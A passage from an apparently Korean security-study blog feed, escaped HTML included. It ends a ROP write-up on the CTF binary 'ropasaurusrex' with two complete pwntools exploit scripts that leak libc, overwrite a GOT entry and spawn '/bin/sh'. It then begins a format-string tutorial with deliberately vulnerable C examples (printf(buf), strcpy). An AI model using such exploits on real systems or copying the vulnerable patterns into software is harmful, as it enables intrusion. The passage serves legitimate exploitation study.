중 pop-pop-pop-ret이 연속적인 주소로 된 것을 고르면 된다. 0x080484b6를 사용하면 될 것 같다. ropper는 좀 더 이뿌게 보여진다. 0x04 Exploit 먼저 생각해야 할 점은 Libc의 주소를 leak해야 하며, 이유는 system함수의 주소를 구하기 위함이다. Libc에 주소를 구하는 방법은 여러가지 방법이 있겠다. 예를들어서 read함수의 주소를 구하고, 거기서 read함수의 offset을 빼면 Libc의 주소가 나온다. 그리고 Libc주소에 system함수의 offset을 더하면 system함수의 주소가 된다. 즉 코드로 설명하면 libc_addr = read_addr - read_offset system_addr = libc_addr + system_offset 또 다른 방법은 read주소와 system주소의 차이를 구한다. 그리고 read함수의 주소를 leak하고 그 차이를 더하거나 빼면 system함수가 주소가 된다. gdb-peda$ p system $1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xf7e40da0 &amp;lt;system&amp;gt; gdb-peda$ p read $2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xf7edbb00 &amp;lt;read&amp;gt; gdb-peda$ p/x 0xf7edbb00 - 0xf7e40da0 $3 = 0x9ad60 system_addr = read_addr - 0x9ad60 어떤 방법을 사용하던 편한 것으로 사용하면된다. 필자는 2번째 방법을 사용하였다. from pwn import * path = &quot;./ropasaurusrex&quot; # prepare to exploit read_plt = 0x804832c read_got = 0x804961c write_plt = 0x804830c write_got = 0x8049614 read_system_offset = 0x9ad60 dummy = 0xdeadbeef pppr = 0x080484b6 binsh = &quot;/bin/sh&quot; binsh_len = len(binsh) #p = remote(&quot;localhost&quot;, 7777) p = process(path) e = ELF(path) # BoF payload = &quot;A&quot;*140 # read read_got leak payload += p32(write_plt) payload += p32(pppr) payload += p32(1) payload += p32(read_got) payload += p32(4) # input &quot;/bin/sh&quot; into bss payload += p32(read_plt) payload += p32(pppr) payload += p32(0) payload += p32(e.bss()) payload += p32(binsh_len) # got overwrite : read() -&amp;gt; system() payload += p32(read_plt) payload += p32(pppr) payload += p32(0) payload += p32(read_got) payload += p32(4) # call func ( system(&quot;/bin/sh&quot;) ) payload += p32(read_plt) payload += p32(dummy) payload += p32(e.bss()) p.send(payload) # recv read_addr (leak) read_addr = u32(p.recv(4)) print &quot;read_addr : &quot; +hex(read_addr) # calc system_addr system_addr = read_addr - read_system_offset print &quot;system_addr : &quot; + hex(system_addr) # send &quot;/bin/sh&quot; p.send(binsh) # send system_addr p.send(p32(system_addr)) p.interactive() 다음은 위 ex코드를 pwntool에 어마무시한 기능들로 다 때려박은 코드이다. 물론 아래 코드가 훨씬 간편하고 쉽겠지만, 기본 개념들을 익히기 위해서 위코드를 먼저 확실히 이해하고 tool의 기능들을 사용하는 것이 독약이 안되는 길이다. from pwn import * # prepare to exploit binsh = &quot;/bin/sh&quot; binsh_len = len(binsh) p = remote(&quot;localhost&quot;, 7777) #p = process('./rop') e = ELF('./rop') libc = e.libc rop = ROP(e) # read read_got leak rop.write(1, e.got['read'], 4) # input &quot;/bin/sh&quot; into bss rop.read(0, e.bss(), binsh_len) # got overwrite : read() -&amp;gt; system() rop.read(0, e.got['read'], 4) # call func ( system(&quot;/bin/sh&quot;) ) rop.read(e.bss()) p.send(&quot;A&quot;*140 + rop.chain()) # recv read_addr (leak) read_addr = u32(p.recv(4)) print &quot;[*]read_addr : &quot; +hex(read_addr) # calc system_addr system_addr = read_addr - libc.symbols['read'] + libc.symbols['system'] print &quot;[*]system_addr : &quot; + hex(system_addr) # send &quot;/bin/sh&quot; p.send(binsh) # send system_addr p.send(p32(system_addr)) p.interactive()</summary></entry><entry><title type="html">Format String Attack</title><link href="http://localhost:4000/2018/09/04/study-system-Format-String-Attack.html" rel="alternate" type="text/html" title="Format String Attack" /><published>2018-09-04T00:00:00+00:00</published><updated>2018-09-04T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/04/study-system-Format%20String%20Attack</id><content type="html" xml:base="http://localhost:4000/2018/09/04/study-system-Format-String-Attack.html">&lt;h2 id=&quot;1-format-string이란&quot;&gt;1. Format String이란?&lt;/h2&gt;

&lt;h3 id=&quot;0x01-format-string&quot;&gt;0x01. Format String&lt;/h3&gt;

&lt;p&gt;다음은 일반 C프로그램에서 흔히 찾아볼 수 있는 printf함수이다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;World!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello, %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;직관적으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; &quot;&lt;/code&gt; 안에 포함되어 있는 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hello, %s\n&quot;&lt;/code&gt;이 Format String이다.&lt;/p&gt;

&lt;p&gt;즉, Format String은 이를 사용하는 함수에 대해 어떤 형식 또는 &lt;strong&gt;형태를 지정해 주는 문자열&lt;/strong&gt; 을 의미한다.&lt;/p&gt;

&lt;h3 id=&quot;0x02-format-string-사용시-문제점&quot;&gt;0x02. Format String 사용시 문제점&lt;/h3&gt;

&lt;p&gt;일반적으로 프로그래머들이 printf 함수를 사용할 할때 다음과 같은 형식으로 작성한다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;printf(&quot;%s&quot;, str);     //1번 코드
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;하지만 어떤 프로그래머들은 프로그래밍을 보다 편하게 하기 위해서 다음과 같이 작성한다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//2번 코드&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;프로그래밍 측면으로 봤을때 1번 코드와, 2번 코드가 잘못된 문법은 아니다. 그리고 2번 코드가 보다 짧은 코드를 사용한다. 따라서 2번 코드가 좀 더 현명해 보일 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;그러나 2번 소스코드를 이용하여 프로그래밍을 하는 경우는 해커들에게 프로그램의 흐름을 바꿀 수 있는 기회를 제공하게 된다.&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex01.c&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello, World!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;//1번 코드&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;//2번 코드&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/1.png&quot; alt=&quot;그림1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위 그림과 같이 1번, 2번 코드 모두 같은 기능을 수행하는 것을 볼 수 있다. 그러면 두 코드의 차이는 무엇일까?&lt;/p&gt;

&lt;h3 id=&quot;0x03-포맷-인자&quot;&gt;0x03. 포맷 인자&lt;/h3&gt;

&lt;p&gt;printf와 같은 Format String을 사용하는 함수는 &lt;strong&gt;포맷 인자(형식 인자)&lt;/strong&gt;를 함수에 인자로 넘겨 특정 동작을 수행한다.&lt;/p&gt;

&lt;p&gt;각 포맷인자는 함수의 인자로 넘겨지며, &lt;strong&gt;Format String에 3개의 포맷 인자가 있으면 함수에도 3개의 인자가 있어야 한다.&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;인자&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;입력 타입&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;출력 타입&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;%d&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;값&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;10진수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;%u&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;값&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;부호 없는 10진수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;%x&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;값&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;16진수&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;%s&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;포인터&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;문자열&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;%n&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;포인터&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;지금까지 출력한 바이트 수&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;0x04-새로운-지시자drective-n&quot;&gt;0x04. 새로운 지시자(drective) “%n”&lt;/h3&gt;

&lt;p&gt;Format String에 사용되는 형식 지시자들 중 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; 은 지금까지 출력한 바이트 수를 &lt;u&gt;다음 변수에 저장&lt;/u&gt;한다.&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex02.c&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;235&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d %n%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//%n 지시자 사용&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;The offset was %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/2.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ex02 소스코드를 보면 &lt;strong&gt;pos변수에 4라는 값이 저장&lt;/strong&gt;되는 것을 볼 수 있다. 이는 &lt;strong&gt;“%d %n%d\n”&lt;/strong&gt; Format String에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; 직전까지의 &lt;strong&gt;“%d “&lt;/strong&gt;을 봐야 한다. printf를 통해 화면에 출력될 때 “235 93”이 출력된다. &lt;strong&gt;이때 %n 직전에 문자열은 “235 “이 된다. 따라서 4Byte의 문자열(공백포함)이기에 4라는 숫자가 pos변수에 저장된다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;또 다른 예제를 좀더 살펴보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex03.c&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%.100d%n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;//%n 지시자 사용&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;position: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/3.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ex03코드 같은 경우 pos변수에 100이 저장된다. (%100d 형식지시자는 정수를 100자리로 표현)&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex04.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_two&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
  &lt;span class=&quot;c1&quot;&gt;//%n 포맷 스트링 예제&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//이 X포인트까지 출력한 바이트 수는 count_one에 저장되고,&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//여기의 X까지의 바이트 수는 count_two에 저장된다.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count_two&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
 
 
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;count_one : %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;count_two : %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_two&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/4.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/4-1.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;2-printf-함수&quot;&gt;2. printf 함수&lt;/h2&gt;

&lt;h3 id=&quot;0x01-printf-함수의-동작방식&quot;&gt;0x01. printf 함수의 동작방식&lt;/h3&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex05.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x is %d/%#x (@ %p)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

